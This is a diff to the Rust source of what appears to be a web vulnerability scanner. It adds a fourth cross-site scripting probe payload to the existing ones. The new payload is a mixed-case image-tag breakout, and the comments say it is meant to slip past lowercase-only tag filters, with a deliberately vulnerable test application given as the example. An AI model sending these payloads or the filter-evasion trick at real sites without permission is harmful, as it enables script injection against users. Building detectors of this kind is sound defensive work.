@@ -3872,7 +3872,14 @@ async fn probe_xss(client: &Client, site: &Site) -> Option<Value> {
     // verbatim and produced a FALSE POSITIVE; requiring the intact `<tag ...>` makes the app's encoding
     // of `<`/`>` the discriminator, which is exactly what determines exploitability.
     let m = &marker;
-    let cases: [(&str, String, String); 3] = [
+    // Four payloads, all of which require the WHOLE tag back intact, which is
+    // what keeps the oracle sound. The fourth is the same breakout in mixed
+    // case, because a filter that pattern-matches `<img`, `<svg` or `<script`
+    // in lowercase is common and cheap to write, and nothing in the first three
+    // gets past it. VulnerableApp's XSSWithHtmlTagInjection level 2 is exactly
+    // that: `<svg onload=...>` and `<script>` come back empty, and
+    // `<ImG SrC=x OnErRoR=...>` comes back raw inside the div.
+    let cases: [(&str, String, String); 4] = [
         (
             "HTML",
             format!("{m}\"'><img src=x onerror=alert({m})>"),
@@ -3887,6 +3894,11 @@ async fn probe_xss(client: &Client, site: &Site) -> Option<Value> {
             "<script>",
             format!("{m}</script><svg onload=alert({m})>"),
             format!("</script><svg onload=alert({m})>"),
+        ),
+        (
+            "HTML",
+            format!("{m}\"'><ImG SrC=x OnErRoR=alert({m})>"),
+            format!("<ImG SrC=x OnErRoR=alert({m})>"),
         ),
     ];
     for (ctx, payload, detector) in &cases {
